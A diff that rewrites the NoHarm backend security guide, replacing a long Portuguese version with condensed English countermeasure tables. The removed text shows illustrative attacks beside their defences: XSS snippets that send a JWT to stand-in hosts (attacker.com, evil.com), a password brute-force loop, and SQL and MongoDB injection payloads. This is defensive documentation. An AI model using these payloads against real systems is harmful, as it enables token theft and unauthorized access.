@@ -1,2669 +1,596 @@
-# 🛡️ Guia Completo de Segurança - Backend NoHarm
+# Security Guide — NoHarm Backend
 
-## Índice
-1. [Ataques de Autenticação](#1-ataques-de-autenticação)
-2. [Ataques de Injeção](#2-ataques-de-injeção)
-3. [Ataques de Sessão](#3-ataques-de-sessão)
-4. [Ataques de Negação de Serviço](#4-ataques-de-negação-de-serviço)
-5. [Ataques de Dados](#5-ataques-de-dados)
-6. [Ataques de WebSocket](#6-ataques-de-websocket)
-7. [Configuração Completa](#7-configuração-completa)
+This document describes every attack vector considered during the design of the NoHarm backend, the countermeasures implemented, and those still pending. It serves as both a reference and a checklist for security audits.
 
 ---
 
-## 1. Ataques de Autenticação
+## Table of Contents
 
-### 1.1 JWT Token Theft (Roubo de Token)
-
-**O que é:**
-Atacante consegue roubar o token JWT do usuário e usá-lo para se passar por ele.
-
-**Como acontece:**
-```javascript
-// Cenário 1: XSS rouba token do localStorage
-<script>
-  fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
-</script>
-
-// Cenário 2: Man-in-the-middle em HTTP (não HTTPS)
-GET /api/user HTTP/1.1
-Authorization: Bearer eyJhbGciOiJIUzI1NiIs... ← Interceptado!
-
-// Cenário 3: Malware no dispositivo
-```
-
-**Prevenção:**
-
-```python
-# backend/security/jwtHandler.py
-import jwt
-import secrets
-from datetime import datetime, timedelta
-from typing import Optional, Dict
-import os
-
-class JwtHandler:
-    def __init__(self):
-        # Secrets devem estar em variáveis de ambiente
-        self.secretKey = os.getenv('JWT_SECRET_KEY')
-        self.refreshSecretKey = os.getenv('JWT_REFRESH_SECRET_KEY')
-        self.algorithm = 'HS256'
-        
-        # MEDIDA 1: Token de acesso com vida CURTA
-        self.accessTokenExpire = timedelta(minutes=15)  # Apenas 15 minutos
-        
-        # MEDIDA 2: Refresh token com vida mais longa
-        self.refreshTokenExpire = timedelta(days=7)
-    
-    def createAccessToken(self, userId: str, deviceId: str = None) -> str:
-        """
-        Cria token de acesso com claims mínimos
-        
-        MEDIDA 3: JTI (JWT ID) único para cada token
-        Permite revogar tokens específicos
-        """
-        payload = {
-            'sub': userId,                                    # Subject (quem)
-            'type': 'access',                                 # Tipo do token
-            'exp': datetime.utcnow() + self.accessTokenExpire, # Expiração
-            'iat': datetime.utcnow(),                         # Emitido em
-            'jti': secrets.token_urlsafe(16),                 # ID único
-            'device_id': deviceId or 'unknown'                # Dispositivo
-        }
-        
-        return jwt.encode(payload, self.secretKey, algorithm=self.algorithm)
-    
-    def createRefreshToken(self, userId: str, deviceId: str = None) -> str:
-        """
-        Cria refresh token para renovar access tokens
-        """
-        payload = {
-            'sub': userId,
-            'type': 'refresh',
-            'exp': datetime.utcnow() + self.refreshTokenExpire,
-            'iat': datetime.utcnow(),
-            'jti': secrets.token_urlsafe(16),
-            'device_id': deviceId or 'unknown'
-        }
-        
-        return jwt.encode(payload, self.refreshSecretKey, algorithm=self.algorithm)
-    
-    def verifyToken(self, token: str, tokenType: str = 'access') -> Optional[Dict]:
-        """
-        MEDIDA 4: Verificação rigorosa de tokens
-        """
-        try:
-            # Usa chave correta baseada no tipo
-            secret = self.secretKey if tokenType == 'access' else self.refreshSecretKey
-            
-            # Decodifica e valida
-            payload = jwt.decode(
-                token, 
-                secret, 
-                algorithms=[self.algorithm],
-                options={
-                    'verify_exp': True,  # Verifica expiração
-                    'verify_iat': True,  # Verifica data de emissão
-                    'require': ['sub', 'type', 'exp', 'iat', 'jti']  # Campos obrigatórios
-                }
-            )
-            
-            # MEDIDA 5: Verifica tipo do token
-            if payload.get('type') != tokenType:
-                print(f"⚠️ Token type mismatch: expected {tokenType}, got {payload.get('type')}")
-                return None
-            
-            # MEDIDA 6: Verifica se token foi revogado (blacklist)
-            if self.isTokenBlacklisted(payload.get('jti')):
-                print(f"⚠️ Token revoked: {payload.get('jti')[:8]}...")
-                return None
-            
-            return payload
-            
-        except jwt.ExpiredSignatureError:
-            print("⚠️ Token expired")
-            return None
-        except jwt.InvalidTokenError as e:
-            print(f"⚠️ Invalid token: {str(e)}")
-            return None
-    
-    def isTokenBlacklisted(self, jti: str) -> bool:
-        """
-        MEDIDA 7: Blacklist de tokens revogados
-        Implementar com Redis para performance
-        """
-        # TODO: Implementar com Redis
-        # return redis_client.exists(f"blacklist:{jti}")
-        return False
-    
-    def revokeToken(self, jti: str, expiresIn: int):
-        """
-        Adiciona token à blacklist
-        """
-        # TODO: Implementar com Redis
-        # redis_client.setex(f"blacklist:{jti}", expiresIn, "1")
-        pass
-
-
-# Exemplo de uso:
-# -----------------
-jwtHandler = JwtHandler()
-
-# Login: criar tokens
-accessToken = jwtHandler.createAccessToken(userId="user123", deviceId="mobile-abc")
-refreshToken = jwtHandler.createRefreshToken(userId="user123", deviceId="mobile-abc")
-
-# Retornar ao cliente
-response = {
-    "access_token": accessToken,
-    "refresh_token": refreshToken,
-    "token_type": "Bearer",
-    "expires_in": 900  # 15 minutos em segundos
-}
-
-# Verificar token em requisições
-payload = jwtHandler.verifyToken(accessToken, tokenType='access')
-if payload:
-    userId = payload['sub']
-    # Prosseguir com requisição
-else:
-    # Token inválido, expirado ou revogado
-    return {"error": "Unauthorized"}, 401
-```
-
-**Exemplo de fluxo completo:**
-
-```python
-# backend/routes/auth.py
-from fastapi import APIRouter, HTTPException, Depends
-from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
-
-router = APIRouter()
-security = HTTPBearer()
-jwtHandler = JwtHandler()
-
-@router.post("/login")
-async def login(username: str, password: str):
-    """Login e geração de tokens"""
-    
-    # 1. Verificar credenciais (exemplo simplificado)
-    user = database.getUserByUsername(username)
-    if not user or not bcrypt.checkpw(password.encode(), user.password_hash.encode()):
-        raise HTTPException(status_code=401, detail="Credenciais inválidas")
-    
-    # 2. Gerar tokens
-    accessToken = jwtHandler.createAccessToken(userId=user.id)
-    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
-    
-    # 3. Salvar refresh token no banco (para rotação)
-    database.saveRefreshToken(userId=user.id, token=refreshToken)
-    
-    return {
-        "access_token": accessToken,
-        "refresh_token": refreshToken,
-        "token_type": "Bearer"
-    }
-
-
-@router.post("/refresh")
-async def refreshAccessToken(refreshToken: str):
-    """Renovar access token usando refresh token"""
-    
-    # 1. Verificar refresh token
-    payload = jwtHandler.verifyToken(refreshToken, tokenType='refresh')
-    if not payload:
-        raise HTTPException(status_code=401, detail="Refresh token inválido")
-    
-    userId = payload['sub']
-    
-    # 2. Verificar se refresh token existe no banco
-    if not database.isRefreshTokenValid(userId, refreshToken):
-        raise HTTPException(status_code=401, detail="Refresh token não encontrado")
-    
-    # 3. ROTAÇÃO: Revogar refresh token antigo
-    jwtHandler.revokeToken(payload['jti'], expiresIn=604800)  # 7 dias
-    
-    # 4. Criar novos tokens
-    newAccessToken = jwtHandler.createAccessToken(userId=userId)
-    newRefreshToken = jwtHandler.createRefreshToken(userId=userId)
-    
-    # 5. Salvar novo refresh token
-    database.updateRefreshToken(userId=userId, oldToken=refreshToken, newToken=newRefreshToken)
-    
-    return {
-        "access_token": newAccessToken,
-        "refresh_token": newRefreshToken,
-        "token_type": "Bearer"
-    }
-
-
-@router.post("/logout")
-async def logout(credentials: HTTPAuthorizationCredentials = Depends(security)):
-    """Logout e revogação de tokens"""
-    
-    token = credentials.credentials
-    
-    # 1. Verificar token
-    payload = jwtHandler.verifyToken(token, tokenType='access')
-    if not payload:
-        raise HTTPException(status_code=401, detail="Token inválido")
-    
-    userId = payload['sub']
-    jti = payload['jti']
-    
-    # 2. Revogar access token
-    jwtHandler.revokeToken(jti, expiresIn=900)  # 15 minutos
-    
-    # 3. Revogar todos refresh tokens do usuário
-    database.revokeAllRefreshTokens(userId)
-    
-    return {"message": "Logout realizado com sucesso"}
-
-
-def getCurrentUser(credentials: HTTPAuthorizationCredentials = Depends(security)) -> str:
-    """
-    Dependency para proteger rotas
-    Uso: @router.get("/protected", dependencies=[Depends(getCurrentUser)])
-    """
-    token = credentials.credentials
-    payload = jwtHandler.verifyToken(token, tokenType='access')
-    
-    if not payload:
-        raise HTTPException(status_code=401, detail="Token inválido ou expirado")
-    
-    return payload['sub']  # Retorna userId
-```
+1. [Authentication Attacks](#1-authentication-attacks)
+2. [Injection Attacks](#2-injection-attacks)
+3. [Session Attacks](#3-session-attacks)
+4. [Denial of Service](#4-denial-of-service)
+5. [Data Attacks](#5-data-attacks)
+6. [WebSocket Attacks](#6-websocket-attacks)
+7. [Account & Identity Attacks](#7-account--identity-attacks)
+8. [Infrastructure & Configuration Risks](#8-infrastructure--configuration-risks)
+9. [Supply Chain & Dependency Risks](#9-supply-chain--dependency-risks)
+10. [Implementation Status](#10-implementation-status)
 
 ---
 
-### 1.2 Brute Force Attack (Ataque de Força Bruta)
+## 1. Authentication Attacks
 
-**O que é:**
-Atacante tenta milhares de combinações de senha até acertar.
+### 1.1 JWT Token Theft
 
-**Como acontece:**
-```python
-# Bot tentando senhas comuns:
-for password in ['123456', 'password', '12345678', 'qwerty', ...]:
-    response = requests.post('/login', json={
-        'username': 'maria@email.com',
-        'password': password
-    })
-    if response.status_code == 200:
-        print(f"SENHA ENCONTRADA: {password}")
-        break
+**What it is:** An attacker steals the victim's JWT and impersonates them.
+
+**Attack vectors:**
+- XSS extracts the token from `localStorage`
+- Man-in-the-middle on plain HTTP
+- Malware on the device
+
+**Countermeasures implemented (`src/security/jwtHandler.py`):**
+
+| Measure | Detail |
+|---------|--------|
+| Short-lived access token | 15-minute expiry — stolen tokens expire quickly |
+| Long-lived refresh token | 7-day expiry — issued only on login |
+| Unique JTI per token | Every token has a `jti` claim; allows individual revocation |
+| Token type enforcement | `verifyToken()` checks the `type` claim matches the expected type |
+| Persistent blacklist | Revoked JTIs are stored hashed (SHA-256) in a JSONL file via `TokenBlacklist` |
+| Refresh token rotation | Each `/refresh` call should invalidate the old refresh token |
+
+**Token lifecycle:**
+```
+Login → issue accessToken (15 min) + refreshToken (7 days)
+        │
+        ├─ Each request → verify accessToken → check blacklist
+        │
+        └─ On expiry → POST /refresh → verify refreshToken
+                                      → revoke old refreshToken (blacklist)
+                                      → issue new accessToken + new refreshToken
+
+Logout → revoke accessToken + revoke refreshToken → both added to blacklist
 ```
 
-**Prevenção:**
+**Blacklist implementation (`src/security/tokenBlacklist.py`):**
 
-```python
-# backend/security/rateLimiter.py
-from datetime import datetime, timedelta
-from typing import Dict, Tuple
-import time
-
-class LoginRateLimiter:
-    """
-    MEDIDA 1: Rate limiting específico para login
-    """
-    def __init__(self):
-        # Armazena tentativas: {username: [timestamp1, timestamp2, ...]}
-        self.loginAttempts: Dict[str, list] = {}
-        
-        # Armazena bloqueios: {username: timestamp_bloqueio}
-        self.lockedAccounts: Dict[str, datetime] = {}
-        
-        # Configurações
-        self.maxAttempts = 5           # Máximo 5 tentativas
-        self.windowMinutes = 15        # Em 15 minutos
-        self.lockoutMinutes = 30       # Bloqueia por 30 minutos
-    
-    def isAccountLocked(self, username: str) -> Tuple[bool, int]:
-        """
-        Verifica se conta está bloqueada
-        Retorna: (está_bloqueado, segundos_restantes)
-        """
-        if username in self.lockedAccounts:
-            lockedUntil = self.lockedAccounts[username]
-            now = datetime.utcnow()
-            
-            if now < lockedUntil:
-                # Ainda bloqueado
-                remainingSeconds = int((lockedUntil - now).total_seconds())
-                return True, remainingSeconds
-            else:
-                # Bloqueio expirou
-                del self.lockedAccounts[username]
-                return False, 0
-        
-        return False, 0
-    
-    def recordLoginAttempt(self, username: str, success: bool) -> Tuple[bool, int]:
-        """
-        Registra tentativa de login
-        Retorna: (permitido, tentativas_restantes)
-        """
-        # Verifica se já está bloqueado
-        isLocked, remaining = self.isAccountLocked(username)
-        if isLocked:
-            return False, 0
-        
-        now = datetime.utcnow()
-        
-        # Se login bem-sucedido, limpa histórico
-        if success:
-            if username in self.loginAttempts:
-                del self.loginAttempts[username]
-            return True, self.maxAttempts
-        
-        # Inicializa lista de tentativas se não existir
-        if username not in self.loginAttempts:
-            self.loginAttempts[username] = []
-        
-        # Remove tentativas antigas (fora da janela de tempo)
-        cutoff = now - timedelta(minutes=self.windowMinutes)
-        self.loginAttempts[username] = [
-            ts for ts in self.loginAttempts[username] 
-            if ts > cutoff
-        ]
-        
-        # Adiciona nova tentativa
-        self.loginAttempts[username].append(now)
-        
-        # Conta tentativas na janela
-        attempts = len(self.loginAttempts[username])
-        remaining = self.maxAttempts - attempts
-        
-        # MEDIDA 2: Bloqueio progressivo
-        if attempts >= self.maxAttempts:
-            # Bloqueia conta
-            lockUntil = now + timedelta(minutes=self.lockoutMinutes)
-            self.lockedAccounts[username] = lockUntil
-            
-            # MEDIDA 3: Log de segurança
-            print(f"🚨 CONTA BLOQUEADA: {username} após {attempts} tentativas")
-            
-            return False, 0
-        
-        # MEDIDA 4: Aviso após 3 tentativas
-        if attempts >= 3:
-            print(f"⚠️ ALERTA: {username} - {attempts} tentativas falhas")
-        
-        return True, remaining
-
-
-class IpRateLimiter:
-    """
-    MEDIDA 5: Rate limiting por IP
-    Previne ataques distribuídos
-    """
-    def __init__(self):
-        self.ipAttempts: Dict[str, list] = {}
-        self.blockedIps: Dict[str, datetime] = {}
-        
-        self.maxAttemptsPerIp = 20     # 20 tentativas por IP
-        self.windowMinutes = 10         # Em 10 minutos
-        self.blockMinutes = 60          # Bloqueia por 1 hora
-    
-    def isIpBlocked(self, ip: str) -> Tuple[bool, int]:
-        """Verifica se IP está bloqueado"""
-        if ip in self.blockedIps:
-            blockedUntil = self.blockedIps[ip]
-            now = datetime.utcnow()
-            
-            if now < blockedUntil:
-                remaining = int((blockedUntil - now).total_seconds())
-                return True, remaining
-            else:
-                del self.blockedIps[ip]
-                return False, 0
-        
-        return False, 0
-    
-    def recordIpAttempt(self, ip: str) -> Tuple[bool, int]:
-        """Registra tentativa por IP"""
-        isBlocked, remaining = self.isIpBlocked(ip)
-        if isBlocked:
-            return False, 0
-        
-        now = datetime.utcnow()
-        
-        if ip not in self.ipAttempts:
-            self.ipAttempts[ip] = []
-        
-        # Remove tentativas antigas
-        cutoff = now - timedelta(minutes=self.windowMinutes)
-        self.ipAttempts[ip] = [ts for ts in self.ipAttempts[ip] if ts > cutoff]
-        
-        # Adiciona nova tentativa
-        self.ipAttempts[ip].append(now)
-        
-        attempts = len(self.ipAttempts[ip])
-        remaining = self.maxAttemptsPerIp - attempts
-        
-        if attempts >= self.maxAttemptsPerIp:
-            blockUntil = now + timedelta(minutes=self.blockMinutes)
-            self.blockedIps[ip] = blockUntil
-            print(f"🚨 IP BLOQUEADO: {ip} após {attempts} tentativas")
-            return False, 0
-        
-        return True, remaining
-
-
-# Uso na rota de login:
-# ----------------------
-loginLimiter = LoginRateLimiter()
-ipLimiter = IpRateLimiter()
-
-@router.post("/login")
-async def login(request: Request, username: str, password: str):
-    """Login com proteção contra brute force"""
-    
-    # Obter IP do cliente
-    clientIp = request.client.host
-    
-    # VERIFICAÇÃO 1: Checar se IP está bloqueado
-    ipBlocked, ipRemaining = ipLimiter.isIpBlocked(clientIp)
-    if ipBlocked:
-        raise HTTPException(
-            status_code=429,
-            detail=f"IP bloqueado. Tente novamente em {ipRemaining}s"
-        )
-    
-    # VERIFICAÇÃO 2: Checar se conta está bloqueada
-    accountLocked, accountRemaining = loginLimiter.isAccountLocked(username)
-    if accountLocked:
-        raise HTTPException(
-            status_code=429,
-            detail=f"Conta bloqueada. Tente novamente em {accountRemaining}s"
-        )
-    
-    # Tentar autenticar
-    user = database.getUserByUsername(username)
-    isValidPassword = user and bcrypt.checkpw(password.encode(), user.password_hash.encode())
-    
-    # MEDIDA 6: Tempo constante de resposta (evita timing attacks)
-    time.sleep(0.1)  # 100ms sempre, sucesso ou falha
-    
-    # Registrar tentativa
-    ipAllowed, ipRemaining = ipLimiter.recordIpAttempt(clientIp)
-    accountAllowed, attemptsRemaining = loginLimiter.recordLoginAttempt(username, isValidPassword)
-    
-    if not isValidPassword:
-        # MEDIDA 7: Mensagem genérica (não revela se username existe)
-        raise HTTPException(
-            status_code=401,
-            detail=f"Credenciais inválidas. {attemptsRemaining} tentativas restantes"
-        )
-    
-    # Login bem-sucedido
-    accessToken = jwtHandler.createAccessToken(userId=user.id)
-    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
-    
-    return {
-        "access_token": accessToken,
-        "refresh_token": refreshToken
-    }
-```
-
-**MEDIDA 8: Adicionar CAPTCHA após tentativas**
-
-```python
-# backend/security/captcha.py
-import requests
-import os
-
-class CaptchaVerifier:
-    def __init__(self):
-        self.secretKey = os.getenv('RECAPTCHA_SECRET_KEY')
-    
-    def verify(self, token: str, userIp: str) -> bool:
-        """Verifica token do reCAPTCHA"""
-        response = requests.post('https://www.google.com/recaptcha/api/siteverify', data={
-            'secret': self.secretKey,
-            'response': token,
-            'remoteip': userIp
-        })
-        
-        result = response.json()
-        return result.get('success', False)
-
-
-# Modificar login para exigir CAPTCHA após 3 tentativas:
-captchaVerifier = CaptchaVerifier()
-
-@router.post("/login")
-async def login(request: Request, username: str, password: str, captchaToken: str = None):
-    # ... código anterior ...
-    
-    # Se já teve 3+ tentativas falhas, exige CAPTCHA
-    if username in loginLimiter.loginAttempts:
-        attempts = len(loginLimiter.loginAttempts[username])
-        if attempts >= 3:
-            if not captchaToken:
-                raise HTTPException(
-                    status_code=400,
-                    detail="CAPTCHA obrigatório após múltiplas tentativas"
-                )
-            
-            if not captchaVerifier.verify(captchaToken, clientIp):
-                raise HTTPException(
-                    status_code=400,
-                    detail="CAPTCHA inválido"
-                )
-    
-    # ... resto do código ...
-```
+The blacklist uses `PersistentHashTable` — an append-only JSONL log. Each `add` operation costs O(1) (single file append). On startup the state is rebuilt by replaying all events. Expired entries are removed via `cleanup()`. JTIs are stored as SHA-256 hashes — plaintext JTIs are never written to disk.
 
 ---
 
-## 2. Ataques de Injeção
+### 1.2 Brute Force Login
+
+**What it is:** An attacker tries thousands of password combinations until one succeeds.
+
+**Countermeasures implemented (`src/security/rateLimiter.py`):**
+
+`LoginRateLimiter` — per-username sliding window:
+
+| Configuration | Value |
+|---------------|-------|
+| Window | 15 minutes |
+| Max attempts | 5 |
+| Lockout duration | 30 minutes |
+| Reset on success | Yes — `onSuccess(username)` clears the attempt history |
+
+`IpRateLimiter` — per-IP sliding window:
+
+| Configuration | Value |
+|---------------|-------|
+| Window | 60 seconds |
+| Max requests | 60 |
+| Block duration | 60 minutes |
+
+**Pending countermeasures:**
+- [ ] Constant-time response (add `time.sleep(0.1)` regardless of success/failure to prevent timing attacks)
+- [ ] CAPTCHA after 3 consecutive failures
+- [ ] Generic error messages that do not reveal whether the username exists
+
+---
+
+## 2. Injection Attacks
 
 ### 2.1 SQL Injection
 
-**O que é:**
-Atacante injeta código SQL malicioso através de inputs.
+**What it is:** An attacker injects malicious SQL through user inputs.
 
-**Como acontece:**
+**Countermeasures implemented:**
+
+- **SQLAlchemy ORM** is used exclusively — parameters are automatically escaped
+- **Pydantic schemas** validate and type-check all inputs before they reach the repository layer
+- Raw SQL (`text()`) is never used in any repository
+
+**Example of safe query (ORM):**
 ```python
-# Código VULNERÁVEL ❌
-username = request.form['username']
-password = request.form['password']
-
-query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
-# Atacante envia: username = "admin' --"
-# Query resultante: SELECT * FROM users WHERE username='admin' --' AND password='...'
-# Comentário (--) ignora verificação de senha!
-```
-
-**Prevenção:**
-
-```python
-# backend/database/userRepository.py
-from sqlalchemy import create_engine, Column, String, Integer, DateTime
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker
-import bcrypt
-
-Base = declarative_base()
-
-class User(Base):
-    """Modelo de usuário com SQLAlchemy"""
-    __tablename__ = 'users'
-    
-    id = Column(String(50), primary_key=True)
-    username = Column(String(100), unique=True, nullable=False)
-    email = Column(String(200), unique=True, nullable=False)
-    password_hash = Column(String(200), nullable=False)
-    created_at = Column(DateTime, nullable=False)
-
-
-class UserRepository:
-    """
-    MEDIDA 1: Usar ORM (SQLAlchemy) ao invés de SQL puro
-    ORM previne SQL Injection automaticamente
-    """
-    def __init__(self, databaseUrl: str):
-        self.engine = create_engine(databaseUrl)
-        Base.metadata.create_all(self.engine)
-        Session = sessionmaker(bind=self.engine)
-        self.session = Session()
-    
-    def getUserByUsername(self, username: str) -> User:
-        """
-        SEGURO: SQLAlchemy usa parametrização automática
-        """
-        return self.session.query(User).filter(
-            User.username == username  # Parametrizado automaticamente
-        ).first()
-    
-    def getUserByEmail(self, email: str) -> User:
-        """SEGURO: Parâmetros escapados"""
-        return self.session.query(User).filter(
-            User.email == email
-        ).first()
-    
-    def createUser(self, userId: str, username: str, email: str, password: str):
-        """
-        MEDIDA 2: Validação de entrada antes de salvar
-        """
-        # Validar formato de email
-        if not self.isValidEmail(email):
-            raise ValueError("Email inválido")
-        
-        # Validar username (apenas alfanuméricos e underscore)
-        if not self.isValidUsername(username):
-            raise ValueError("Username inválido")
-        
-        # MEDIDA 3: Hash de senha com bcrypt
-        passwordHash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
-        
-        newUser = User(
-            id=userId,
-            username=username,
-            email=email,
-            password_hash=passwordHash.decode(),
-            created_at=datetime.utcnow()
-        )
-        
-        self.session.add(newUser)
-        self.session.commit()
-        
-        return newUser
-    
-    def isValidEmail(self, email: str) -> bool:
-        """Valida formato de email"""
-        import re
-        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-        return re.match(pattern, email) is not None
-    
-    def isValidUsername(self, username: str) -> bool:
-        """Valida username (whitelist de caracteres)"""
-        import re
-        # Apenas letras, números, underscore e hífen
-        pattern = r'^[a-zA-Z0-9_-]{3,30}$'
-        return re.match(pattern, username) is not None
-
-
-# Se REALMENTE precisar usar SQL puro (não recomendado):
-# -------------------------------------------------------
-from sqlalchemy import text
-
-def getUserByIdRaw(userId: str) -> dict:
-    """
-    MEDIDA 4: Se usar SQL puro, SEMPRE usar parâmetros
-    """
-    # ❌ NUNCA FAÇA ISTO:
-    # query = f"SELECT * FROM users WHERE id = '{userId}'"
-    
-    # ✅ SEMPRE FAÇA ISTO:
-    query = text("SELECT * FROM users WHERE id = :user_id")
-    result = session.execute(query, {"user_id": userId})
-    return result.fetchone()
-```
-
-**Exemplo de ataque bloqueado:**
-
-```python
-# Tentativa de ataque:
-maliciousUsername = "admin' OR '1'='1' --"
-
-# Com SQL puro VULNERÁVEL ❌:
-query = f"SELECT * FROM users WHERE username='{maliciousUsername}'"
-# Resultado: SELECT * FROM users WHERE username='admin' OR '1'='1' --'
-# Retorna TODOS os usuários! 🚨
-
-# Com SQLAlchemy SEGURO ✅:
-user = session.query(User).filter(User.username == maliciousUsername).first()
-# SQLAlchemy converte para:
-# SELECT * FROM users WHERE username = 'admin'' OR ''1''=''1'' --'
-# Busca literalmente por esse username estranho, não encontra nada ✅
+# Attacker input: "admin' OR '1'='1' --"
+user = session.query(UserModel).filter(UserModel.email == email).first()
+# SQLAlchemy binds the value as a parameter — the injection string is treated as a literal
 ```
 
 ---
 
-### 2.2 NoSQL Injection (MongoDB)
+### 2.2 XSS (Cross-Site Scripting)
 
-**O que é:**
-Similar ao SQL Injection, mas em bancos NoSQL como MongoDB.
+**What it is:** An attacker injects malicious JavaScript that executes in other users' browsers.
 
-**Como acontece:**
-```python
-# Código VULNERÁVEL ❌
-username = request.json['username']
-password = request.json['password']
+**Countermeasures implemented:**
 
-# Atacante envia: {"username": {"$ne": null}, "password": {"$ne": null}}
-user = db.users.find_one({"username": username, "password": password})
-# Retorna qualquer usuário (primeira conta no banco)!
-```
+`src/security/sanitizer.py` — `Sanitizer.cleanHtml()`:
+- Strips all HTML tags via `bleach` (`ALLOWED_TAGS = {}`)
+- Applied to any user-supplied free-text before persistence
 
-**Prevenção:**
+`src/security/middleware.py` — `SecurityHeadersMiddleware`:
 
-```python
-# backend/database/mongoRepository.py
-from pymongo import MongoClient
-from typing import Optional, Dict, Any
-import re
+| Header | Value |
+|--------|-------|
+| `Content-Security-Policy` | `default-src 'self'` + per-resource restrictions |
+| `X-Content-Type-Options` | `nosniff` |
+| `X-Frame-Options` | `DENY` |
+| `X-XSS-Protection` | `1; mode=block` |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
+| `Referrer-Policy` | `strict-origin-when-cross-origin` |
 
-class MongoUserRepository:
-    def __init__(self, connectionString: str):
-        self.client = MongoClient(connectionString)
-        self.db = self.client['noharm']
-        self.users = self.db['users']
-    
-    def getUserByUsername(self, username: str) -> Optional[Dict]:
-        """
-        MEDIDA 1: Validar que entrada é STRING, não objeto
-        """
-        # Verifica tipo
-        if not isinstance(username, str):
-            raise ValueError("Username deve ser string")
-        
-        # MEDIDA 2: Sanitizar entrada (remover caracteres especiais do MongoDB)
-        sanitizedUsername = self.sanitizeMongoInput(username)
-        
-        return self.users.find_one({"username": sanitizedUsername})
-    
-    def sanitizeMongoInput(self, value: str) -> str:
-        """
-        Remove operadores do MongoDB ($, .)
-        """
-        if not isinstance(value, str):
-            raise ValueError("Valor deve ser string")
-        
-        # Remove $ e .
-        sanitized = value.replace('$', '').replace('.', '')
-        
-        return sanitized
-    
-    def validateUserInput(self, data: Dict[str, Any]) -> Dict[str, str]:
-        """
-        MEDIDA 3: Validação rigorosa de tipos
-        """
-        validated = {}
-        
-        # Username
-        if 'username' not in data or not isinstance(data['username'], str):
-            raise ValueError("Username inválido")
-        validated['username'] = self.sanitizeMongoInput(data['username'])
-        
-        # Email
-        if 'email' not in data or not isinstance(data['email'], str):
-            raise ValueError("Email inválido")
-        validated['email'] = self.sanitizeMongoInput(data['email'])
-        
-        # Password
-        if 'password' not in data or not isinstance(data['password'], str):
-            raise ValueError("Password inválido")
-        validated['password'] = data['password']  # Será hasheado
-        
-        return validated
-    
-    def createUser(self, userData: Dict) -> str:
-        """Cria usuário com validação"""
-        # Valida e sanitiza
-        validated = self.validateUserInput(userData)
-        
-        # Hash de senha
-        validated['password_hash'] = bcrypt.hashpw(
-            validated.pop('password').encode(),
-            bcrypt.gensalt(rounds=12)
-        ).decode()
-        
-        # Insere
-        result = self.users.insert_one(validated)
-        return str(result.inserted_id)
-
-
-# Uso seguro:
-# -----------
-@router.post("/register")
-async def register(request: Request):
-    data = await request.json()
-    
-    try:
-        # MEDIDA 4: Validação com Pydantic
-        validatedData = UserRegistrationSchema(**data)
-        
-        # Criar usuário
-        userId = mongoRepo.createUser(validatedData.dict())
-        
-        return {"user_id": userId}
-        
-    except ValueError as e:
-        raise HTTPException(status_code=400, detail=str(e))
-
-
-# Schema de validação com Pydantic:
-from pydantic import BaseModel, validator, EmailStr
-
-class UserRegistrationSchema(BaseModel):
-    username: str
-    email: EmailStr
-    password: str
-    
-    @validator('username')
-    def validateUsername(cls, v):
-        # MEDIDA 5: Whitelist de caracteres
-        if not re.match(r'^[a-zA-Z0-9_-]{3,30}$', v):
-            raise ValueError('Username inválido')
-        
-        # Remove operadores MongoDB
-        if '$' in v or '.' in v:
-            raise ValueError('Caracteres não permitidos')
-        
-        return v
-    
-    @validator('password')
-    def validatePassword(cls, v):
-        # MEDIDA 6: Requisitos de senha forte
-        if len(v) < 8:
-            raise ValueError('Senha deve ter no mínimo 8 caracteres')
-        
-        if not re.search(r'[A-Z]', v):
-            raise ValueError('Senha deve conter letra maiúscula')
-        
-        if not re.search(r'[a-z]', v):
-            raise ValueError('Senha deve conter letra minúscula')
-        
-        if not re.search(r'[0-9]', v):
-            raise ValueError('Senha deve conter número')
-        
-        return v
-```
+**Pending countermeasures:**
+- [ ] Apply `Sanitizer.cleanHtml()` consistently in all schemas that accept free-text fields (message content, display names, etc.)
 
 ---
 
-### 2.3 XSS (Cross-Site Scripting)
+### 2.3 Mass Assignment
 
-**O que é:**
-Atacante injeta JavaScript malicioso que roda no navegador de outros usuários.
+**What it is:** An attacker includes extra fields in a request body (e.g. `"isAdmin": true`) that should not be settable by regular users.
 
-**Como acontece:**
-```javascript
-// Usuário malicioso envia mensagem:
-const message = "<script>fetch('https://evil.com/steal?token=' + localStorage.token)</script>";
+**Countermeasures implemented:**
 
-// Se app renderizar sem sanitizar:
-chatDiv.innerHTML = message;  // ❌ Script executa!
+Pydantic schemas act as an explicit whitelist. Only fields declared in a schema can be updated. FastAPI ignores any extra fields by default.
 
-// JavaScript do atacante roda e rouba token
-```
-
-**Prevenção:**
-
-```python
-# backend/security/sanitizer.py
-import bleach
-import re
-from typing import Dict, Any
-
-class InputSanitizer:
-    """
-    MEDIDA 1: Sanitização de HTML no backend
-    (Defesa em profundidade - sanitizar no front E back)
-    """
-    
-    def __init__(self):
-        # MEDIDA 2: Whitelist de tags permitidas
-        self.allowedTags = []  # NoHarm não permite HTML
-        self.allowedAttributes = {}
-    
-    def sanitizeHtml(self, content: str) -> str:
-        """
-        Remove TODAS as tags HTML e scripts
-        """
-        if not isinstance(content, str):
-            return ""
-        
-        # Remove tags HTML
-        cleaned = bleach.clean(
-            content,
-            tags=self.allowedTags,
-            attributes=self.allowedAttributes,
-            strip=True  # Remove tags ao invés de escapar
-        )
-        
-        # MEDIDA 3: Remove caracteres de controle perigosos
-        cleaned = re.sub(r'[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]', '', cleaned)
-        
-        # MEDIDA 4: Remove javascript: e data: URIs
-        cleaned = re.sub(r'javascript:', '', cleaned, flags=re.IGNORECASE)
-        cleaned = re.sub(r'data:', '', cleaned, flags=re.IGNORECASE)
-        
-        return cleaned.strip()
-    
-    def sanitizeMessage(self, message: Dict[str, Any]) -> Dict[str, str]:
-        """Sanitiza mensagem de chat"""
-        if not isinstance(message, dict):
-            raise ValueError("Mensagem deve ser objeto")
-        
-        return {
